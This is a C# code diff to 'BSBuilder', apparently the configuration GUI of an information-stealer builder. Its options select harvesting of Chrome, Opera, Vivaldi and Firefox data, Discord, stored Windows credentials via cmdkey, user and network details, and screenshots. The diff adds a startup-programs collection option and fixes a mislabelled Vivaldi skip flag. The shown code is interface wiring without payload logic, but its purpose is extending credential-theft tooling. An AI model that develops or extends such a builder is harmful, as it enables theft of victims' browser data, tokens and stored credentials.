@@ -34,6 +34,7 @@ namespace BSBuilder
             tasklistcheckbox.Checked = settings.tasklist;
             netusercheckbox.Checked = settings.netuser;
             qusercheckbox.Checked = settings.quser;
+            startupprogramscheckbox.Checked = settings.startupprograms;
             cmdkeycheckbox.Checked = settings.cmdkey;
             ipconfigcheckbox.Checked = settings.ipconfig;
             screenshotcheckbox.Checked = settings.screenshot;
@@ -82,7 +83,7 @@ namespace BSBuilder
         {
             InitializeComponent();
 
-            this.Size = new Size(500, 761);
+            this.Size = new Size(500, 790);
 
             setProperties();
 
@@ -168,6 +169,7 @@ namespace BSBuilder
             handleBooleanSetting(settings.quser, "skipquser");
             handleBooleanSetting(settings.cmdkey, "skipcmdkey");
             handleBooleanSetting(settings.ipconfig, "skipipconfig");
+            handleBooleanSetting(settings.startupprograms, "skipstartupprograms");
 
             if (settings.screenshot)
             {
@@ -186,7 +188,7 @@ namespace BSBuilder
         {
             handleBooleanSetting(settings.chrome, "skipchrome");
             handleBooleanSetting(settings.opera, "skipopera");
-            handleBooleanSetting(settings.vivaldi, "settings.vivaldi");
+            handleBooleanSetting(settings.vivaldi, "skipvivaldi");
             handleBooleanSetting(settings.firefox, "skipfirefox");
             handleBooleanSetting(settings.osu, "skiposu");
             handleBooleanSetting(settings.discord, "skipdiscord");
@@ -716,14 +718,14 @@ namespace BSBuilder
             if (UI_open)
             {
                 UI_open = false;
-                this.Size = new Size(500, 761);
+                this.Size = new Size(500, 790);
                 inspectorbutton.Text = ">";
 
             }
             else
             {
                 UI_open = true;
-                this.Size = new Size(1232, 761);
+                this.Size = new Size(1232, 790);
                 inspectorbutton.Text = "<";
             }
         }
@@ -751,6 +753,11 @@ namespace BSBuilder
         private void CertLayerPicker_ValueChanged(object sender, EventArgs e)
         {
             settings.certlayers = Convert.ToInt32(CertLayerPicker.Value);
+        }
+
+        private void startupprogramcheckbox_CheckedChanged(object sender, EventArgs e)
+        {
+            checkboxChangeHandler(sender);
         }
     }
 }
